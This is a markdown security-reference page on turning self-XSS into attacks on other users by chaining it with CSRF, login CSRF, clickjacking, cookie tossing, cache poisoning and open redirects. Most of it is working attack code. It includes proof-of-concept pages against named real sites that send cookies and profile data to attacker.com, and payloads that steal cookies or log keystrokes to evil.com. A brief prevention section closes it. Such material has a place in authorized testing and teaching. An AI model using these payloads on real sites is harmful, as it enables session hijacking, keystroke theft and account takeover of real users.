---
title: Self-XSS Escalation Chains
description: Turn worthless Self-XSS into impactful vulnerabilities through attack chains
tags:
  - high
  - xss
  - chain
  - csrf
  - cache-poisoning
  - clickjacking
category: attack-chains
severity: high
last_updated: 2026-02-15
---

# Self-XSS Escalation Chains

## TL;DR

**Self-XSS alone is worthless** — you can only XSS yourself. But chain it with another vulnerability and suddenly you're attacking other users.

| Chain | Difficulty | Impact | Prerequisites |
|-------|------------|--------|---------------|
| Self-XSS + CSRF | Easy | High | CSRF on XSS trigger action |
| Self-XSS + Login CSRF | Medium | Critical | No OAuth state param, logout CSRF |
| Self-XSS + Clickjacking | Easy | Medium-High | No X-Frame-Options |
| Self-XSS + Cookie Tossing | Medium | High | Subdomain XSS, shared cookie domain |
| Self-XSS + Cache Poisoning | Hard | Critical | Unkeyed header reflects XSS |
| Self-XSS + Open Redirect | Easy | Medium | Open redirect on same domain |

**The mindset**: Found Self-XSS? Don't close Burp. Hunt for the chain.

---

## Chain 1: Self-XSS + CSRF

### The Technique

Force a victim to trigger an action that causes Self-XSS to execute in THEIR session.

**Flow:**
1. Victim visits attacker's page
2. Attacker's page submits a CSRF form that injects XSS payload into victim's profile/settings
3. Victim is redirected to the vulnerable page
4. XSS executes in victim's session

### When It Works

- The Self-XSS injection point is a stored field (profile, settings, preferences)
- The action that stores the payload has no CSRF protection
- The page where XSS fires is accessible after injection

### Real Example: Imgur Profile XSS

**Scenario**: User can inject XSS into their own bio field. Bio field has no CSRF protection.

**Attack PoC:**
```html
<!DOCTYPE html>
<html>
<head><title>Click to Win!</title></head>
<body>
  <h1>Loading Prize...</h1>
  
  <form id="pwn" action="https://imgur.com/account/settings" method="POST">
    <input type="hidden" name="bio" value='"><img src=x onerror="fetch(`https://attacker.com/steal?cookie=`+document.cookie)">'>
  </form>
  
  <script>
    document.getElementById('pwn').submit();
    // Redirect to profile page after submission
    setTimeout(() => {
      window.location = 'https://imgur.com/user/VICTIM_USERNAME';
    }, 1000);
  </script>
</body>
</html>
```

**Why it works:**
- No CSRF token on bio update
- XSS in bio fires when any user views the profile
- Stored XSS now affects all visitors

### Payload Variations

```html
<!-- Basic cookie steal -->
<img src=x onerror="new Image().src='https://evil.com/?c='+document.cookie">

<!-- Full session hijack with fetch -->
<img src=x onerror="fetch('https://evil.com/log',{method:'POST',body:document.cookie})">

<!-- Keylogger injection -->
<img src=x onerror="document.onkeypress=function(e){fetch('https://evil.com/k?k='+e.key)}">
```

### HackerOne Reports

- [#632017](https://hackerone.com/reports/632017) - Zomato: Self-Stored XSS chained with login/logout CSRF for account takeover
- [#177508](https://hackerone.com/reports/177508) - Starbucks: Reflected XSS via CSRF on wishlist

---

## Chain 2: Self-XSS + Login CSRF

### The Technique

This is the **crown jewel** of Self-XSS escalation. Force victim to log into YOUR account (where XSS payload waits), execute JavaScript, then log them back into THEIR account to steal data.

**Flow:**
1. Attacker sets up XSS payload in their own account
2. Victim visits attacker's page
3. Victim is logged out of their session (but keeps auth cookie on auth server)
4. Victim is logged into attacker's account via login CSRF
5. XSS payload fires in attacker's account context
6. Payload logs victim back into their own account
7. Now attacker has code running in victim's authenticated session

### When It Works

- OAuth flow missing `state` parameter (login CSRF)
- Logout endpoint has no CSRF protection
- Application uses separate auth server (OAuth/SSO)
- X-Frame-Options is `sameorigin` (not `deny`)

### Real Example: Uber Partners (Jack Whitton)

This is the famous case study: [whitton.io/articles/uber-turning-self-xss-into-good-xss/](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)

**The Setup:**
- XSS in profile address field (only visible to account owner)
- OAuth callback `/oauth/callback?code=...` has no `state` parameter
- Logout endpoint `/logout` has no CSRF protection

**Step 1: Block logout redirect using CSP**
```html
<!-- Only allow requests to partners.uber.com, block login.uber.com -->
<meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">

<!-- This logs out of partners but CSP blocks the redirect to login.uber.com -->
<img src="https://partners.uber.com/logout/" onerror="loginAttacker()">
```

**Step 2: Log victim into attacker's account**
```javascript
function loginAttacker() {
  // Initiate OAuth flow
  var loginImg = document.createElement('img');
  loginImg.src = 'https://partners.uber.com/login/';
  loginImg.onerror = function() {
    // Use attacker's pre-captured OAuth code
    var code = 'ATTACKER_OAUTH_CODE';
    var callbackImg = document.createElement('img');
    callbackImg.src = 'https://partners.uber.com/oauth/callback?code=' + code;
    callbackImg.onerror = function() {
      // Redirect to page with XSS payload
      window.location = 'https://partners.uber.com/profile/';
    }
  }
}
```

**Step 3: XSS payload (in attacker's profile)**
```javascript
// Create iframe to log victim back into their account
var loginIframe = document.createElement('iframe');
loginIframe.src = 'https://attacker.com/re-login.html';
loginIframe.style.display = 'none';
document.body.appendChild(loginIframe);

// Wait, then access victim's actual session
setTimeout(function() {
  var victimFrame = document.createElement('iframe');
  victimFrame.src = 'https://partners.uber.com/profile/';
  victimFrame.id = 'victim';
  document.body.appendChild(victimFrame);
  
  // Extract victim data
  victimFrame.onload = function() {
    var data = victimFrame.contentWindow.document.body.innerHTML;
    var email = data.match(/value="([^"]+)" name="email"/)[1];
    // Exfiltrate
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({email: email, html: data})
    });
  }
}, 5000);
```

**Step 4: re-login.html (logs victim back in)**
```html
<meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
<img src="https://partners.uber.com/logout/" onerror="redir()">
<script>
  function redir() {
    // This redirects to login flow which auto-authenticates via login.uber.com cookie
    window.location = 'https://partners.uber.com/login/';
  }
</script>
```

### Why This Works

1. **CSP blocks cross-domain redirects** — Victim stays logged into auth server
2. **Login CSRF** — No state parameter means we can force login to any account
3. **Logout CSRF** — We can destroy only the app session, not auth session
4. **X-Frame-Options: sameorigin** — We can iframe pages from same origin while our code runs

### Key Insight

> The victim never knows they briefly logged into attacker's account. The entire flow takes < 10 seconds and they end up on their own profile.

---

## Chain 3: Self-XSS + Clickjacking

### The Technique

Frame the vulnerable page and trick the victim into clicking a button that triggers the Self-XSS.

**Flow:**
1. Embed vulnerable page in hidden iframe
2. Overlay fake UI on top
3. Victim's click actually triggers XSS action
4. XSS executes in victim's session

### When It Works

- Page with Self-XSS can be framed (no X-Frame-Options / weak CSP)
- XSS can be triggered with a single click (button, link, etc.)
- Trigger element position is predictable

### Real Example: Settings Page XSS

**Scenario**: XSS fires when user clicks "Save Settings" with malicious input already in a field.

**Attack PoC:**
```html
<!DOCTYPE html>
<html>
<head>
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 500px;
    height: 400px;
    opacity: 0.0001; /* Nearly invisible */
    z-index: 2;
  }
  .overlay {
    position: absolute;
    top: 185px; /* Align with Save button */
    left: 120px;
    z-index: 1;
  }
  button {
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
  }
</style>
</head>
<body>
  <h1>Claim Your Prize!</h1>
  <div class="overlay">
    <button>Click to Claim $500</button>
  </div>
  
  <!-- Pre-fill XSS via URL parameter if possible -->
  <iframe src="https://vulnerable.com/settings?name=<img src=x onerror=alert(document.domain)>"></iframe>
</body>
</html>
```

### Advanced: Drag-and-Drop Clickjacking

For Self-XSS in text fields that need typed input:

```html
<style>
  #source { 
    position: absolute;
    font-size: 20px;
  }
  iframe {
    position: absolute;
    top: 50px;
    opacity: 0.0001;
  }
</style>

<div id="source" draggable="true">&lt;img src=x onerror=alert(1)&gt;</div>
<p>Drag the text to the box below:</p>
<iframe src="https://vulnerable.com/profile/edit"></iframe>
```

### Double Clickjacking

For actions requiring confirmation:

```javascript
// First click: inject payload
// Second click: submit form
let clickCount = 0;
document.addEventListener('click', () => {
  clickCount++;
  if (clickCount === 1) {
    moveIframeTo('input-field');
  } else if (clickCount === 2) {
    moveIframeTo('submit-button');
  }
});
```

---

## Chain 4: Self-XSS + Cookie Tossing

### The Technique

Set a cookie from a subdomain that triggers XSS on the main domain.

**Flow:**
1. Find XSS on any subdomain (even low-value)
2. Use subdomain XSS to set a cookie with XSS payload
3. Cookie is set for `.domain.com` (parent domain)
4. Victim visits main site
5. Cookie value triggers Self-XSS

### When It Works

- You have XSS on ANY subdomain (sandbox.example.com, beta.example.com)
- Main domain has Self-XSS that reads from cookies
- Cookies aren't using `__Host-` prefix (can't be tossed)

### Real Example: Cookie-Based UI Injection

**Scenario**: 
- `sandbox.example.com` has XSS
- `www.example.com` reads `ui_theme` cookie and reflects it unsafely

**Step 1: Subdomain XSS sets malicious cookie**
```javascript
// Execute on sandbox.example.com
document.cookie = "ui_theme=</style><script>alert(document.domain)</script>; domain=.example.com; path=/";
```

**Step 2: Victim visits www.example.com**
```html
<!-- Server-side template -->
<style>
  body { theme: {{cookies.ui_theme}}; }
</style>

<!-- Rendered as -->
<style>
  body { theme: </style><script>alert(document.domain)</script>; }
</style>
```

### Cookie Tossing Attack Page

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
  <script>
    // Set poisoned cookie from subdomain
    document.cookie = "user_prefs=<img src=x onerror=fetch('https://evil.com/c?c='+document.cookie)>; domain=.example.com; path=/; expires=Fri, 31 Dec 2027 23:59:59 GMT";
    
    // Redirect to main domain to trigger
    window.location = "https://www.example.com/dashboard";
  </script>
</body>
</html>
```

### Defense Bypass Notes

```javascript
// __Host- prefix prevents cookie tossing (CANNOT set from subdomain)
// SECURE: __Host-session=abc123

// But regular cookies CAN be tossed
// VULNERABLE: session=abc123
// VULNERABLE: theme=dark
```

---

## Chain 5: Self-XSS + Cache Poisoning

### The Technique

Poison a web cache so your Self-XSS payload is served to other users.

**Flow:**
1. Find reflected Self-XSS (only fires in your request)
2. Identify unkeyed inputs (headers not in cache key)
3. Inject XSS via unkeyed header
4. Cache stores malicious response
5. All subsequent users get XSS

### When It Works

- XSS injection point is in an unkeyed header (X-Forwarded-Host, Origin, etc.)
- Response is cached (check `Cache-Control`, `Age`, `X-Cache` headers)
- Cache key doesn't include the vulnerable header

### Real Example: Twitter Cache Poisoning (H1 #84601)

**Vulnerability**: `upload.twitter.com` allowed file uploads that reflected content-type in `ton.twitter.com` responses, which were cached.

**Attack Vector:**
```http
GET /1.1/ton/data/dm/x/malicious.jpg HTTP/1.1
Host: ton.twitter.com
```

Where `malicious.jpg` was uploaded with:
- Filename ending in `.jpg` (bypassed extension check)
- Content: `<script>alert(document.domain)</script>`
- Served with `Content-Type: text/html` (due to content sniffing)

**Result**: Cached HTML response served to all users requesting that path.

### Cache Poisoning Detection

```bash
# 1. Find cacheable endpoints
curl -I https://target.com/static/app.js
# Look for: Age, X-Cache: HIT, Cache-Control: public

# 2. Test unkeyed headers
curl https://target.com/ -H "X-Forwarded-Host: evil.com" -I
# Check if response changes (redirect to evil.com?)

# 3. Verify poison persistence
curl https://target.com/  # Without header
# If still poisoned = vulnerable
```

### Cache Poison XSS PoC

```http
GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: "><script>alert(1)</script>

# If response contains:
<meta property="og:url" content="https://"><script>alert(1)</script>/...">
# And response is cached — you win
```

### Cache Buster (Safe Testing)

Always use cache busters when testing to avoid poisoning production:

```http
GET /?cachebust=uniquerandomstring123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

### HackerOne Reports

- [#84601](https://hackerone.com/reports/84601) - Twitter: XSS and cache poisoning via ton.twitter.com
- [#1424094](https://hackerone.com/reports/1424094) - Glassdoor: Web Cache Poisoning to XSS
- [#1760213](https://hackerone.com/reports/1760213) - Expedia: Account Takeover via Cache Poisoning XSS

---

## Chain 6: Self-XSS + Open Redirect

### The Technique

Use an open redirect to deliver Self-XSS payload or chain authentication flows.

**Flow:**
1. Find Self-XSS that requires specific URL parameters
2. Find open redirect on same domain
3. Chain: Open redirect → Page with XSS → Payload fires
4. Or: Use redirect to smuggle XSS in `next` parameter

### When It Works

- Self-XSS is reflected from URL parameters
- Open redirect exists on same domain
- Application has loose URL validation

### Real Example: OAuth Redirect XSS

**Scenario**:
- Self-XSS at `/callback?error=<payload>` (error message reflected)
- Open redirect at `/redirect?url=...`

**Attack Chain:**
```
https://vulnerable.com/redirect?url=https://vulnerable.com/callback?error=<script>alert(1)</script>
```

Or with encoding to bypass filters:
```
https://vulnerable.com/redirect?url=//vulnerable.com/callback%3Ferror%3D%3Cscript%3Ealert(1)%3C/script%3E
```

### JavaScript Protocol Redirect

If open redirect allows `javascript:` protocol:

```
https://vulnerable.com/redirect?url=javascript:alert(document.domain)
```

### Login Flow Abuse

```html
<!-- Attacker page -->
<script>
  // 1. Redirect to login with malicious callback
  window.location = 'https://vulnerable.com/login?redirect=/profile?name=<script>alert(1)</script>';
</script>
```

User logs in → redirected to `/profile?name=<script>...` → XSS fires

### HackerOne Reports

- OAuth redirect XSS patterns are common in authentication bypasses
- Look for `redirect_uri`, `next`, `return_to`, `callback` parameters

---

## Detection Checklist

When you find Self-XSS, systematically check for chains:

```markdown
□ CSRF on XSS injection action?
  - Check for CSRF tokens
  - Test token removal/reuse
  
□ Login CSRF possible?
  - OAuth state parameter present?
  - Logout endpoint CSRF protected?
  
□ Page frameable?
  - X-Frame-Options header?
  - CSP frame-ancestors?
  
□ Cookie-based injection?
  - Any subdomain XSS?
  - Cookie reflected in responses?
  
□ Cached response?
  - Age / X-Cache headers?
  - Unkeyed inputs (test X-Forwarded-*)
  
□ Open redirect exists?
  - /redirect?url= endpoints?
  - OAuth callback manipulation?
```

---

## Prevention

### For Developers

```python
# Always use CSRF tokens
@csrf_protect
def update_profile(request):
    ...

# Validate OAuth state parameter
if request.args.get('state') != session.get('oauth_state'):
    abort(403)

# Strict X-Frame-Options
response.headers['X-Frame-Options'] = 'DENY'

# Use __Host- cookie prefix
response.set_cookie('__Host-session', value, secure=True, httponly=True)

# Include all headers in cache key
# Or don't reflect unkeyed headers at all
```

### Cache Configuration

```nginx
# Nginx: Vary on relevant headers
add_header Vary "Accept-Encoding, X-Forwarded-Host";

# Or strip dangerous headers
proxy_set_header X-Forwarded-Host "";
```

---

## References

- [Jack Whitton - Uber Self-XSS Escalation](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)
- [PortSwigger - Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [HackerOne Report #84601 - Twitter Cache Poisoning](https://hackerone.com/reports/84601)
- [HackerOne Report #632017 - Zomato Login CSRF Chain](https://hackerone.com/reports/632017)
- [OAuth Security - Egor Homakov](http://www.oauthsecurity.com/)
- [Bugcrowd VRT - XSS Classifications](https://bugcrowd.com/vulnerability-rating-taxonomy)

---

> **Remember**: A "worthless" Self-XSS is just an XSS waiting for its partner vulnerability. Keep hunting.
